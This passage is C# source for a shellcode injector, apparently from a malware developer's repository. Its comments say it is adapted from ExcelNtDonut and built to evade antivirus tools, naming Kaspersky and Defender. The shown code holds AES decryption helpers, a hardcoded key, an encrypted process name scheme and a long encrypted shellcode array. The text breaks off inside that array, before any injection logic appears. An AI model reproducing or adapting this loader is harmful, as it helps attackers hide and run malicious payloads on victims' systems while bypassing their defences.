//This is a c# injector that holds an encrypted shellcode and decrypts the shellcode before injecting.
//This injector also encrypts the process_name in which shellcode will be injected as further obfuscation.
//This encryption/decryption process is used  to bypass static analysis and to some extent dynamic analysis
//The injection template has been found and modified from ExcelNtDonut, hence the modified malware name is Donut.
//The AES_shellcode_encryptor had been provide in the repository: https://github.com/shaddy43/AES_Shellcode_Encryptor
//This injector creates an injected process itself therefore bypassing many AVs that detects injection in already running processes like Kaspersky and Defender
//Author: Shaddy43
//Designation: Malware Analyst, Reverse engineer & malware developer

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.IO;
using System.Text;
using System.Security.Cryptography;

public class Test
{

    public static string DecryptAES(byte[] encrypted, string aes_key, byte[] aes_iv)
    {
        string decrypted = null;
        byte[] cipher = encrypted;

        using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
        {
            aes.Key = Convert.FromBase64String(aes_key);
            aes.IV = aes_iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            ICryptoTransform dec = aes.CreateDecryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream(cipher))
            {
                using (CryptoStream cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                {
                    using (StreamReader sr = new StreamReader(cs))
                    {
                        decrypted = sr.ReadToEnd();
                    }
                }
            }
        }
        return decrypted;
    }

    static string ComputeSha256Hash(string rawData)
    {
        // Create a SHA256   
        using (SHA256 sha256Hash = SHA256.Create())
        {
            // ComputeHash - returns byte array  
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

            // Convert byte array to a string   
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < bytes.Length; i++)
            {
                builder.Append(bytes[i].ToString("x2"));
            }
            return builder.ToString();
        }
    }

    public static string ByteArrayToString(byte[] ba)
    {
        StringBuilder hex = new StringBuilder(ba.Length * 2);
        for (int i = 0; i < ba.Length - 1; i++)
        {
            hex.AppendFormat("0x" + "{0:x2}" + ", ", ba[i]);
        }
        hex.AppendFormat("0x" + "{0:x2}", ba[ba.Length - 1]);
        return hex.ToString();
    }

    public static void Main()
    {
        string aes_key = "M55a5e145b31444fdb89f1dba36d2dc07";
        byte[] aes_iv = { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };

        byte[] shellcode;
        byte[] process_byte;

        //shell
        shellcode = new byte[] { 0x5d, 0xaf, 0xbe, 0xb9, 0xd7, 0x02, 0x35, 0x45, 0x59, 0xdc, 0xae, 0xd1, 0xee, 0x36, 0x81, 0x6d, 0x32, 0x4a, 0x60, 0xe8, 0x2f, 0x9d, 0x46, 0x06, 0x6a, 0x72, 0xcb, 0x56, 0x83, 0x3a, 0xb3, 0x98, 0xac, 0x62, 0x8e, 0xa7, 0x55, 0xf1, 0x64, 0x39, 0x7f, 0x3a, 0x5a, 0x78, 0xb0, 0x15, 0x20, 0x96, 0xac, 0x02, 0xed, 0x23, 0xb9, 0x2a, 0xba, 0x22, 0x0f, 0x4d, 0x29, 0xb2, 0xf3, 0xfb, 0x17, 0xe6, 0xba, 0xb0, 0x2d, 0x66, 0x97, 0x98, 0x7e, 0x7a, 0x1f, 0x3c, 0x7f, 0x35, 0xff, 0xaf, 0x95, 0xbc, 0x32, 0x76, 0xa3, 0xd8, 0xee, 0xec, 0xf2, 0x18, 0x9a, 0xd4, 0x07, 0x08, 0xe0, 0x2d, 0xf6, 0xde, 0xc7, 0x85, 0xfe, 0x16, 0x90, 0x11, 0xde, 0xd4, 0x92, 0x09, 0x91, 0x2d, 0x3d, 0x41, 0xe9, 0x2a, 0xfb, 0xa8, 0x95, 0x5b, 0xea, 0xf3, 0x7a, 0x92, 0xad, 0x87, 0x8d, 0xc2, 0x30, 0x28, 0x37, 0x9f, 0x0a, 0x63, 0xb6, 0x32, 0x8d, 0x85, 0x7c, 0x48, 0xc8, 0x80, 0x22, 0xa0, 0x22, 0xe7, 0xe8, 0xf7, 0xd8, 0x43, 0x2a, 0xbc, 0xba, 0xc4, 0x4d, 0x23, 0x13, 0x8c, 0x51, 0xeb, 0x62, 0x53, 0x63, 0xfd, 0xf6, 0x43, 0x9e, 0xfe, 0xba, 0xa9, 0x33, 0x42, 0x49, 0xca, 0x2d, 0xa7, 0x18, 0xd7, 0xf9, 0x85, 0xbf, 0x25, 0x34, 0x4c, 0x5c, 0xd9, 0x0b, 0xa5, 0xcd, 0x60, 0x54, 0x29, 0x5d, 0xb0, 0x7e, 0x88, 0xe1, 0x48, 0xdb, 0x87, 0x8b, 0xb5, 0x97, 0x7b, 0x22, 0x3d, 0xd0, 0x4a, 0xa2, 0x6c, 0xd5, 0xaa, 0x09, 0x2c, 0xd5, 0x5e, 0x1b, 0xff, 0x0a, 0xce, 0xf6, 0x1c, 0x66, 0xe1, 0x32, 0xb6, 0x59, 0xab, 0xa7, 0xb7, 0xc5, 0xe4, 0x8c, 0xe0, 0x3f, 0x17, 0xfc, 0xc8, 0x72, 0x3e, 0xeb, 0x91, 0x54, 0xeb, 0xc0, 0xe6, 0x3c, 0x12, 0x24, 0x69, 0x46, 0xdd, 0x8d, 0x6b, 0x5c, 0x0b, 0xec, 0x7e, 0x5a, 0x6f, 0xd4, 0x55, 0xea, 0xf6, 0xe7, 0x02, 0x1c, 0x59, 0x57, 0x17, 0x98, 0x3b, 0xa0, 0x03, 0xf0, 0xc3, 0x14, 0x96, 0x5b, 0xc3, 0xb3, 0x83, 0x55, 0x4f, 0xe7, 0x25, 0xc2, 0x7b, 0x0d, 0x7d, 0xde, 0x7a, 0x88, 0xab, 0xcd, 0xde, 0x77, 0x0e, 0x84, 0xa6, 0x11, 0x13, 0xc2, 0x0b, 0x3d, 0x75, 0x69, 0xb5, 0x40, 0xb4, 0x19, 0xcf, 0x11, 0x6f, 0x62, 0xa2, 0x41, 0xb3, 0x0d, 0x7e, 0x16, 0x73, 0x7d, 0x23, 0xa6, 0x26, 0x5b, 0x21, 0x51, 0x22, 0x43, 0x56, 0xd6, 0x06, 0x0c, 0xe6, 0xf2, 0xe0, 0x4b, 0x58, 0x4a, 0xb3, 0xcc, 0x93, 0x0f, 0x6c, 0x1e, 0x41, 0x1d, 0x16, 0x4d, 0x29, 0xc3, 0xd5, 0x7d, 0x4a, 0x0e, 0xc2, 0x84, 0x13, 0x70, 0x4f, 0xda, 0x03, 0x75, 0x34, 0xd8, 0x9e, 0xa2, 0x0b, 0x03, 0x38, 0xd9, 0xe5, 0xd3, 0xf1, 0xbf, 0x30, 0xf8, 0x70, 0x70, 0xbc, 0x97, 0x40, 0xea, 0x58, 0x12, 0xf3, 0xe0, 0x7f, 0xbf, 0x54, 0xa6, 0x18, 0xbf, 0x9f, 0xf2, 0xfa, 0x9e, 0x55, 0x58, 0xfd, 0x68, 0x84, 0x10, 0xd2, 0xd2, 0x65, 0xb3, 0x83, 0x9f, 0x69, 0xa9, 0x22, 0x0d, 0x13, 0x68, 0x5a, 0x50, 0xe0, 0x85, 0xd2, 0x01, 0xae, 0x67, 0x77, 0x0d, 0xeb, 0x1a, 0x97, 0x48, 0xac, 0x5c, 0x0f, 0x3c, 0x9d, 0xc7, 0xee, 0xd6, 0x92, 0x34, 0x6a, 0x8a, 0x54, 0x61, 0xc5, 0x04, 0xca, 0xb8, 0xa5, 0xdd, 0x46, 0x5d, 0xe5, 0x12, 0x61, 0xbd, 0x7f, 0x50, 0xf4, 0x0a, 0xf1, 0xe9, 0x1c, 0x47, 0x8c, 0x62, 0x56, 0xa7, 0xf0, 0x41, 0x31, 0xd9, 0x6d, 0x3d, 0x4e, 0x33, 0x5b, 0x88, 0xaa, 0x96, 0x39, 0x27, 0x8c, 0xff, 0xde, 0x9a, 0x7f, 0xce, 0x1e, 0x8e, 0x53, 0x56, 0xd7, 0x07, 0xa6, 0x85, 0x6d, 0x99, 0xde, 0xf4, 0xa2, 0xd0, 0x7d, 0x4b, 0xde, 0x83, 0xee, 0xdd, 0xe0, 0xc6, 0x4c, 0x14, 0xcd, 0x13, 0xab, 0x38, 0x25, 0x89, 0xd4, 0xd4, 0xcc, 0xb7, 0xf0, 0x3d, 0xe2, 0x3e, 0x85, 0xc0, 0x14, 0x37, 0x54, 0x4d, 0x05, 0x73, 0xa4, 0x10, 0x5a, 0x05, 0x36, 0xbc, 0x06, 0xc8, 0x37, 0x11, 0xe9, 0x98, 0xd1, 0x13, 0x58, 0x51, 0x3b, 0x63, 0xcd, 0xb3, 0x98, 0x57, 0x92, 0x73, 0xe7, 0x6d, 0xe5, 0x05, 0x63, 0x69, 0xac, 0xd1, 0x0a, 0x67, 0xc3, 0x5e, 0xcd, 0xcd, 0x4f, 0x22, 0x69, 0x9b, 0xc3, 0xb8, 0x95, 0xa5, 0xf5, 0x8f, 0x00, 0x6d, 0x84, 0x80, 0x94, 0xf6, 0xf9, 0x17, 0xe0, 0xdc, 0xe7, 0x79, 0x10, 0x56, 0xe7, 0xd7, 0x72, 0x3e, 0xce, 0xa6, 0x92, 0xc0, 0x29, 0x25, 0x4f, 0xe1, 0x47, 0x5e, 0x00, 0x09, 0x33, 0x97, 0x11, 0xa0, 0xc5, 0x4f, 0x5f, 0x03, 0x43, 0xbd, 0x00, 0x8c, 0x05, 0x38, 0x07, 0x91, 0xdb, 0x21, 0x88, 0x4f, 0x5c, 0xe5, 0x47, 0x86, 0xb5, 0x79, 0xae, 0x32, 0x6f, 0x48, 0x67, 0xbf, 0x41, 0x67, 0x26, 0x4f, 0xe7, 0x64, 0x3c, 0xe3, 0x89, 0x79, 0x87, 0xa6, 0xf7, 0x37, 0xe4, 0xb9, 0xcb, 0x79, 0x15, 0xa6, 0xe8, 0x8a, 0xa4, 0xec, 0xcf, 0xed, 0x5d, 0x46, 0x10, 0x14, 0xe8, 0x90, 0x6c, 0x7a, 0xbd, 0x7b, 0xa0, 0xc2, 0x0b, 0x29, 0x68, 0xa1, 0xf2, 0x00, 0x21, 0xbc, 0xf5, 0x4c, 0x0d, 0xb4, 0xfd, 0x51, 0x4a, 0x2d, 0x2c, 0xf4, 0x5b, 0x18, 0x87, 0x24, 0x92, 0x19, 0x53, 0xd0, 0x1c, 0xbc, 0x78, 0x4d, 0x54, 0x8c, 0x05, 0x3e, 0xa9, 0x61, 0x86, 0x3e, 0x0c, 0xd5, 0xd5, 0x91, 0x29, 0x68, 0x7f, 0x4e, 0x62, 0x8f, 0x32, 0x5f, 0x1d, 0xa4, 0xc9, 0x60, 0xc4, 0x44, 0x14, 0x51, 0x97, 0x8c, 0x1a, 0xe9, 0x4a, 0x5a, 0xc0, 0xa6, 0x8b, 0xf6, 0xd9, 0x9e, 0x28, 0xae, 0x2b, 0xe8, 0xfc, 0x0f, 0xb4, 0x83, 0xe9, 0x64, 0xcf, 0x4b, 0xfd, 0xca, 0xe8, 0x7f, 0x27, 0xf1, 0x0a, 0x64, 0xa7, 0x1c, 0x1d, 0xaa, 0xa4, 0x22, 0x98, 0x6a, 0x3c, 0x93, 0xce, 0xbd, 0xd3, 0xe7, 0x83, 0x03, 0x3c, 0x8a, 0xef, 0x44, 0x37, 0xf1, 0x6c, 0xa6, 0x27, 0x5a, 0xba, 0x21, 0x0e, 0x50, 0x3c, 0xe8, 0x29, 0xea, 0xbf, 0xd6, 0x4d, 0xd8, 0x34, 0x4f, 0xa2, 0x47, 0x0f, 0x3d, 0x2f, 0x42, 0xd9, 0x23, 0x60, 0xaa, 0x61, 0x78, 0x56, 0x23, 0xb9, 0x64, 0xbe, 0x44, 0x5a, 0xb7, 0x96, 0xf5, 0x12, 0xc9, 0x65, 0xcb, 0x6c, 0x68, 0x1a, 0x0a, 0xa2, 0xf8, 0x5c, 0xb3, 0x4c, 0x3a, 0xa9, 0xbd, 0x06, 0xd2, 0xd3, 0xd9, 0x1d, 0xa6, 0x0b, 0xff, 0x40, 0x61, 0x1b, 0x80, 0xe3, 0x4b, 0x9c, 0x52, 0xbe, 0xc3, 0xc1, 0xd0, 0x3f, 0xf0, 0x39, 0xa0, 0x9a, 0x50, 0xa6, 0xce, 0x86, 0xee, 0x43, 0xb1, 0x3e, 0x92, 0x67, 0xd3, 0x03, 0x1a, 0xa2, 0xde, 0xc5, 0xdf, 0xf6, 0x18, 0xca, 0x82, 0xd2, 0x25, 0xfa, 0x50, 0x7e, 0x9b, 0x2e, 0x9b, 0x85, 0xa2, 0xf6, 0xa3, 0xb9, 0x95, 0x09, 0xef, 0xdb, 0xe3, 0x9a, 0x88, 0xf5, 0x30, 0x72, 0x84, 0xff, 0x1e, 0x74, 0xb3, 0xe5, 0x61, 0xde, 0x8c, 0x97, 0x3c, 0x24, 0xd0, 0x62, 0x9a, 0x07, 0xf9, 0xdd, 0xe4, 0x8b, 0x0a, 0x27, 0xd1, 0xbc, 0xa5, 0x8b, 0x08, 0xdb, 0xb4, 0xa8, 0xc5, 0x90, 0x05, 0x39, 0xbc, 0x7f, 0x9c, 0xb9, 0x85, 0x16, 0x87, 0x84, 0xa4, 0xd1, 0x71, 0x5c, 0x41, 0x98, 0x0a, 0x0d, 0x89, 0x9c, 0xb7, 0x1d, 0xa6, 0x9f, 0x9b, 0x36, 0x28, 0x8f, 0x66, 0x2e, 0xfa, 0xdc, 0x03, 0x5c, 0xf7, 0xc0, 0x41, 0x84, 0x6d, 0x05, 0x55, 0xd2, 0x54, 0x35, 0x56, 0x7f, 0x2e, 0x49, 0xc8, 0x81, 0xb9, 0x31, 0x7f, 0x7f, 0x92, 0x3c, 0x37, 0x40, 0x86, 0x85, 0x02, 0x52, 0xa4, 0x86, 0x6a, 0xae, 0x91, 0x94, 0x3a, 0x53, 0xc7, 0x90, 0x21, 0xdd, 0xf0, 0xff, 0xdb, 0x13, 0x13, 0xed, 0x50, 0x27, 0x10, 0x78, 0x34, 0x96, 0x97, 0x44, 0x16, 0x41, 0x37, 0x87, 0xde, 0xda, 0x40, 0x8b, 0xb1, 0x6d, 0x88, 0x16, 0x7b, 0xe7, 0x7a, 0x0c, 0xd5, 0x29, 0x1d, 0xb8, 0x46, 0x80, 0xd4, 0xea, 0x62, 0x65, 0x74, 0xba, 0x2e, 0x91, 0x0c, 0x3f, 0xb9, 0x5b, 0x3a, 0x5a, 0x4a, 0x3f, 0x2b, 0x05, 0xeb, 0xc9, 0x8f, 0xa0, 0x6b, 0xcb, 0x8f, 0x4b, 0xbf, 0x8d, 0xcd, 0x8f, 0x27, 0xa9, 0x7c, 0x84, 0x5a, 0xb4, 0x11, 0x52, 0xff, 0xee, 0x49, 0xe0, 0x24, 0x70, 0x99, 0x90, 0xd3, 0x56, 0x3b, 0xfc, 0x38, 0xbb, 0x8f, 0x4b, 0x69, 0x30, 0x2e, 0x5c, 0xe8, 0x0a, 0x60, 0x9b, 0x51, 0x9a, 0xe3, 0xbc, 0x51, 0x8f, 0xc6, 0xf5, 0x5e, 0x8b, 0xc1, 0xe7, 0x22, 0x43, 0xe5, 0xdd, 0x6a, 0x60, 0x8f, 0x1a, 0xe4, 0x08, 0xbe, 0x50, 0xeb, 0xbd, 0x85, 0x28, 0xf8, 0x54, 0xf4, 0xf9, 0x22, 0xe0, 0x89, 0xbb, 0x44, 0x4f, 0x13, 0xbd, 0x71, 0x86, 0x9a, 0x06, 0x29, 0x78, 0xf0, 0x3e, 0xe9, 0xdf, 0x80, 0x6e, 0x87, 0xe1, 0x0f, 0x2c, 0x52, 0x4b, 0xa5, 0x11, 0x4f, 0x45, 0xa8, 0x5d, 0x35, 0x49, 0x13, 0xfd, 0x38, 0xfe, 0x7e, 0x64, 0xee, 0x3d, 0xf2, 0x53, 0x4a, 0x1f, 0x8f, 0x53, 0x5b, 0xba, 0x70, 0x24, 0x6c, 0x4f, 0x36, 0xb1, 0x65, 0xb1, 0x90, 0x24, 0x6d, 0xb7, 0xfa, 0x42, 0xd0, 0x5e, 0x1d, 0xeb, 0x0c, 0x75, 0xbc, 0x0a, 0x66, 0xdf, 0x49, 0x79, 0xb0, 0xc3, 0x28, 0xa3, 0x55, 0xd3, 0xcf, 0x94, 0xe1, 0x60, 0xed, 0x3e, 0x78, 0x59, 0x84, 0xd9, 0xc3, 0xe3, 0xad, 0xc5, 0x05, 0x3d, 0xfc, 0x59, 0x98, 0xef, 0x78, 0x31, 0x36, 0x3a, 0x66, 0xc5, 0xe4, 0xa9, 0xc9, 0xa7, 0x4a, 0x17, 0x95, 0x55, 0x96, 0xa2, 0x57, 0x62, 0x37, 0xd7, 0x59, 0xc1, 0x12, 0x66, 0x6c, 0x5d, 0x90, 0x8e, 0x6e, 0xf0, 0x02, 0xfc, 0x42, 0xe2, 0x6c, 0x16, 0xd9, 0x7d, 0x7d, 0xa4, 0x1b, 0xa8, 0x6a, 0x98, 0xb3, 0xd3, 0xff, 0x4b, 0xa2, 0x7c, 0xf6, 0x10, 0x74, 0xc2, 0x04, 0x08, 0xdf, 0x83, 0xa9, 0x92, 0x82, 0xf3, 0x39, 0x61, 0x50, 0x47, 0x4f, 0xe0, 0xce, 0x15, 0x4f, 0x1a, 0xf4, 0x6f, 0x8f, 0xbe, 0x0e, 0x7a, 0x6d, 0xa2, 0xd2, 0xc8, 0x5a, 0x68, 0x79, 0xe0, 0x64, 0x7e, 0x32, 0x72, 0x57, 0xea, 0x6d, 0x0f, 0x23, 0x3c, 0x84, 0xb7, 0x1f, 0x06, 0xab, 0x17, 0x78, 0x55, 0x1d, 0x7d, 0x01, 0x8e, 0x9e, 0x53, 0xbb, 0xd9, 0x22, 0x3e, 0x71, 0x5a, 0x8d, 0x2f, 0x8d, 0xd5, 0x02, 0xa4, 0x68, 0x8a, 0xb0, 0x97, 0xce, 0xa5, 0x12, 0xba, 0x95, 0x9e, 0xcd, 0xf0, 0x00, 0xeb, 0x5f, 0xde, 0xd6, 0x0b, 0xf6, 0x22, 0x55, 0xec, 0xcf, 0xb9, 0x60, 0xf4, 0xff, 0x81, 0xd4, 0xa8, 0x74, 0x63, 0xbf, 0x60, 0x93, 0x68, 0x22, 0xbb, 0x2d, 0xa0, 0x68, 0x94, 0x13, 0x23, 0x44, 0x37, 0xde, 0x2e, 0xcd, 0x45, 0xc0, 0x55, 0x67, 0x45, 0x1f, 0xec, 0x9c, 0x6d, 0x2a, 0x2a, 0xfa, 0x5c, 0x29, 0xd7, 0x5f, 0xdc, 0xed, 0xab, 0x8d, 0x7c, 0xc8, 0xde, 0xc1, 0x0e, 0x87, 0xcc, 0x52, 0x91, 0x3d, 0x4d, 0xea, 0x27, 0x97, 0x90, 0x98, 0xc6, 0x95, 0x46, 0xd8, 0x9a, 0xcd, 0x60, 0x5d, 0x18, 0xae, 0x70, 0xd2, 0x81, 0x9d, 0x9f, 0x3d, 0xc8, 0xc5, 0xd8, 0xdf, 0x6e, 0xf3, 0x96, 0xcb, 0xdb, 0x9d, 0x7d, 0x8a, 0x1e, 0xe9, 0x3a, 0xae, 0xe8, 0x07, 0x2a, 0x73, 0xe1, 0xfc, 0x6e, 0xff, 0x86, 0x9d, 0x53, 0x8d, 0xf0, 0xfe, 0x1d, 0xd1, 0xfc, 0xc6, 0x90, 0x9c, 0x8d, 0xfb, 0xe1, 0x09, 0xfc, 0xf5, 0xc1, 0x1d, 0xc1, 0x6c, 0x6a, 0xb6, 0x6b, 0x24, 0x7e, 0xa8, 0xc4, 0x18, 0xa1, 0x21, 0x56, 0x5d, 0xd3, 0xb2, 0xdd, 0x99, 0x6d, 0x01, 0xdc, 0xac, 0x97, 0x45, 0x0d, 0x0a, 0x29, 0xd0, 0x74, 0x48, 0xec, 0x70, 0x92, 0x31, 0x4d, 0x9f, 0x69, 0x67, 0x4c, 0x44, 0xc0, 0x29, 0xd3, 0xf5, 0x17, 0xaf, 0x76, 0x87, 0x22, 0x00, 0x56, 0xc8, 0x81, 0x0a, 0xef, 0x5b, 0x0e, 0x50, 0x3b, 0xeb, 0x1f, 0xba, 0xb5, 0x45, 0xca, 0x82, 0x45, 0xb9, 0xab, 0x86, 0x6d, 0x13, 0x3e, 0x39, 0xa5, 0x37, 0x4e, 0x1d, 0x32, 0xb1, 0xc3, 0xdf, 0x7a, 0x03, 0xb3, 0x07, 0x22, 0xc6, 0x93, 0xa6, 0x4b, 0xba, 0xf2, 0x5a, 0x88, 0x40, 0x64, 0x6b, 0x1a, 0xc0, 0x90, 0x05, 0x20, 0x4a, 0xd5, 0x3a, 0x8b, 0x4c, 0x6c, 0xdf, 0x47, 0x5f, 0x20, 0x54, 0x37, 0xb3, 0xb1, 0x84, 0xc1, 0xc0, 0x8e, 0x69, 0x90, 0x1f, 0x3b, 0xd5, 0x38, 0x58, 0xfc, 0xf4, 0x61, 0x80, 0x36, 0x5f, 0x81, 0xaa, 0x3c, 0xb5, 0x48, 0xdc, 0x5b, 0x04, 0x9f, 0x35, 0xe4, 0x6c, 0xd0, 0xe2, 0x86, 0xac, 0x2d, 0x4e, 0x88, 0xd8, 0x1f, 0x14, 0x6c, 0x57, 0x0b, 0xdf, 0x70, 0x14, 0x89, 0x71, 0x05, 0xb7, 0xc2, 0x33, 0x4c, 0xd5, 0xa2, 0x22, 0x1f, 0x01, 0x13, 0x27, 0x6e, 0x67, 0x9b, 0x38, 0x1f, 0x05, 0x92, 0x90, 0x94, 0x11, 0xd3, 0x0f, 0x69, 0x38, 0x22, 0x6f, 0x6e, 0xa1, 0xa0, 0x62, 0x49, 0x67, 0x55, 0x74, 0xbe, 0x12, 0xa4, 0xe7, 0xcc, 0x4b, 0x05, 0x12, 0xbb, 0x32, 0x77, 0xbb, 0xd6, 0xf7, 0x69, 0xcb, 0x2f, 0xa3, 0x52, 0xe5, 0x9c, 0x2f, 0x05, 0x49, 0x7f, 0xf3, 0x53, 0x6c, 0x06, 0x84, 0xb1, 0x4c, 0x8c, 0xb5, 0x95, 0x67, 0xbd, 0xfe, 0x50, 0x5e, 0xd4, 0xdf, 0x67, 0x62, 0x1b, 0x9d, 0xac, 0xfa, 0x83, 0xb6, 0x85, 0x4a, 0xed, 0x50, 0x1a, 0xd4, 0x16, 0x80, 0x6e, 0x50, 0x06, 0x7b, 0x9a, 0xc3, 0x32, 0xa6, 0x16, 0x7e, 0xd6, 0x78, 0xc1, 0x9d, 0x42, 0x6c, 0x50, 0x5c, 0x1e, 0x7f, 0xaa, 0xc4, 0x05, 0xcd, 0xd0, 0xe2, 0x28, 0xa9, 0xc0, 0x5f, 0x67, 0xfe, 0x92, 0x62, 0x08, 0x3f, 0xac, 0x07, 0x60, 0xcb, 0xad, 0x16, 0xb0, 0x3f, 0xfc, 0x80, 0xf0, 0x6c, 0x5c, 0x2c, 0x05, 0x82, 0x13, 0x48, 0x3c, 0x55, 0xc1, 0x88, 0x39, 0x21, 0xae, 0x94, 0x44, 0xfd, 0xa5, 0x9f, 0x22, 0x45, 0x8e, 0x95, 0xa3, 0x01, 0x80, 0x78, 0xfc, 0x08, 0xdf, 0x70, 0xba, 0x77, 0x76, 0xe9, 0xaf, 0x3d, 0x47, 0x8b, 0x80, 0xe6, 0xe9, 0x61, 0xa8, 0x83, 0xe7, 0x8f, 0xfa, 0x8f, 0xcf, 0x07, 0x9e, 0x45, 0xd5, 0xec, 0x3b, 0xaa, 0x58, 0x21, 0x15, 0xc2, 0x2a, 0x24, 0x17, 0xc1, 0x70, 0xc0, 0x85, 0x21, 0xb9, 0xf5, 0x90, 0xed, 0x15, 0x2e, 0x9a, 0x12, 0x2f, 0x0b, 0x3d, 0x77, 0x1c, 0x1a, 0x1f, 0x3f, 0x3b, 0x47, 0x54, 0x0e, 0x9d, 0xb5, 0x7d, 0xf6, 0x9a, 0xec, 0x2e, 0x8a, 0x1c, 0x51, 0xe4, 0xa2, 0xc4, 0xdc, 0x4f, 0xc6, 0xf8, 0xc4, 0xb2, 0xf7, 0x92, 0x0f, 0xf4, 0x83, 0xb5, 0x62, 0x76, 0x26, 0x7e, 0x87, 0x86, 0xdf, 0xfc, 0xd2, 0x4c, 0x80, 0x67, 0xb9, 0x73, 0xf3, 0x0b, 0xda, 0x0e, 0xa9, 0x5c, 0x3f, 0x66, 0xb8, 0xff, 0x1a, 0xfb, 0x34, 0xbf, 0xc8, 0x10, 0x74, 0x6c, 0x6c, 0xd7, 0x6e, 0xdc, 0xe2, 0xab, 0x5f, 0x15, 0x32, 0x3f, 0xe3, 0x4f, 0x3a, 0x35, 0xca, 0x2f, 0x3b, 0x2a, 0xcc, 0xf3, 0x23, 0xa2, 0xf5, 0x6c, 0xcc, 0x6f, 0x22, 0x92, 0x19, 0xf8, 0xb9, 0xcd, 0x2e, 0xcc, 0x9c, 0x19, 0x9c, 0x8d, 0xc9, 0xbc, 0xb4, 0x05, 0x96, 0x70, 0x27, 0x86, 0x74, 0x26, 0xb7, 0x8c, 0xe0, 0x25, 0x1a, 0x5a, 0x25, 0x54, 0x7e, 0xc7, 0xf2, 0x38, 0x2b, 0x53, 0x5d, 0x8a, 0xbf, 0x29, 0x5c, 0xa0, 0x49, 0x88, 0xf0, 0xd6, 0x63, 0xa6, 0x2d, 0xe7, 0x29, 0xca, 0xd3, 0x46, 0xbc, 0xb7, 0x1f, 0x51, 0x5c, 0x13, 0x5e, 0x2d, 0xd4, 0x06, 0xb9, 0x30, 0x78, 0x3c, 0x13, 0xd5, 0xe8, 0x44, 0x1c, 0x35, 0x30, 0x97, 0xd0, 0xf4, 0xa7, 0x24, 0x2f, 0xe4, 0xd6, 0xed, 0x37, 0x37, 0xae, 0x2f, 0x3e, 0xe3, 0x9f, 0xdb, 0xa5, 0xc0, 0x77, 0xdc, 0xe8, 0xe2, 0x91, 0xae, 0xc1, 0x67, 0xcf, 0x5a, 0xd5, 0x0c, 0xdf, 0xf2, 0x0e, 0xe1, 0x29, 0x99, 0xff, 0xfc, 0xfd, 0x2e, 0xe7, 0x16, 0x75, 0x25, 0xbe, 0x96, 0xda, 0xe0, 0xf6, 0x80, 0x48, 0x42, 0x1a, 0x79, 0x0a, 0x31, 0x8d, 0x13, 0xee, 0xef, 0xa5, 0xc9, 0xc8, 0x7b, 0x5c, 0x40, 0xf8, 0xd9, 0x58, 0x22, 0xbc, 0x7b, 0xe5, 0x5c, 0x05, 0xcd, 0x02, 0x84, 0x9c, 0xcc, 0x01, 0xdc, 0xd5, 0x68, 0x4b, 0x40, 0xba, 0xfd, 0xaa, 0xf2, 0x7f, 0x30, 0xfb, 0x3b, 0x89, 0x84, 0x4b, 0xfb, 0x05, 0x07, 0x66, 0x56, 0x50, 0xde, 0x54, 0xda, 0xb2, 0x64, 0x1a, 0x6d, 0x8c, 0x55, 0x37, 0xc2, 0x90, 0xdb, 0x81, 0x28, 0x92, 0x8f, 0x21, 0x51, 0xfa, 0x56, 0xfb, 0x78, 0xfa, 0x78, 0xbd, 0x97, 0x64, 0x66, 0x61, 0x37, 0x81, 0xc1, 0x62, 0xcc, 0xb5, 0x3f, 0x11, 0x42, 0xa7, 0x61, 0xed, 0xe6, 0xf3, 0xa9, 0x19, 0xd4, 0x7a, 0x34, 0xed, 0x51, 0x7c, 0x35, 0xcc, 0x37, 0x9d, 0x28, 0xa8, 0x94, 0xb9, 0xb0, 0xf2, 0xfc, 0xfb, 0x59, 0x35, 0xa2, 0xa2, 0xeb, 0xe8, 0x79, 0xf0, 0x58, 0x4d, 0x2a, 0x37, 0xae, 0x9c, 0xdd, 0x31, 0x98, 0x8e, 0x55, 0x62, 0xbc, 0x18, 0x45, 0x93, 0xdf, 0xe6, 0xf5, 0x2a, 0xe8, 0x0a, 0xde, 0x45, 0xef, 0x24, 0x4e, 0xb8, 0x1e, 0xa1, 0x5e, 0xb1, 0xc2, 0x76, 0x58, 0x74, 0xc0, 0xfd, 0xa9, 0xd5, 0xfa, 0x1f, 0x56, 0x5e, 0xf2, 0x79, 0x51, 0x5e, 0x06, 0xf0, 0x04, 0x60, 0x6a, 0xf9, 0xfa, 0x25, 0x21, 0x6f, 0xea, 0x91, 0x26, 0x9d, 0x37, 0x17, 0x05, 0x13, 0x91, 0xe9, 0x53, 0x51, 0xf4, 0xc8, 0xe0, 0xcc, 0x01, 0x5c, 0x4e, 0xaf, 0x3d, 0x4b, 0x70, 0x9a, 0x62, 0x72, 0x0b, 0x68, 0x8b, 0xbc, 0x0d, 0x19, 0xd3, 0x2b, 0x74, 0x39, 0x3c, 0xa1, 0x63, 0x7e, 0x46, 0x52, 0xd7, 0x0e, 0xb7, 0x93, 0xcb, 0x92, 0x0e, 0x72, 0x1d, 0xdd, 0xe1, 0xf9, 0x1e, 0x4b, 0x4a, 0x4b, 0xcb, 0x24, 0x79, 0x7a, 0x1a, 0x8e, 0xcc, 0xaa, 0xb4, 0x95, 0x97, 0xcc, 0x0a, 0x0a, 0x89, 0x65, 0x04, 0x0e, 0x1c, 0x20, 0x80, 0x97, 0xf0, 0xfd, 0x47, 0xbb, 0xa8, 0x50, 0x5a, 0xcb, 0x07, 0xfe, 0x3f, 0x30, 0xb8, 0x19, 0xe7, 0xfe, 0x1f, 0x83, 0x90, 0xe4, 0xa3, 0xf5, 0xc1, 0x09, 0x9e, 0x94, 0x32, 0x43, 0x97, 0x60, 0xb7, 0x87, 0xc4, 0x1c, 0xe9, 0x27, 0x3b, 0x5e, 0x16, 0x85, 0x0e, 0xf8, 0x12, 0xfb, 0x92, 0x4c, 0xf2, 0x2a, 0x14, 0xc1, 0x1d, 0xac, 0x29, 0x1e, 0x30, 0x24, 0x3c, 0xbe, 0xd7, 0x60, 0xca, 0xf6, 0x7d, 0x81, 0x82, 0xfd, 0x77, 0x25, 0xbb, 0x37, 0x24, 0xf3, 0x78, 0x19, 0xf9, 0x1c, 0x7f, 0x21, 0x75, 0x46, 0xa1, 0x10, 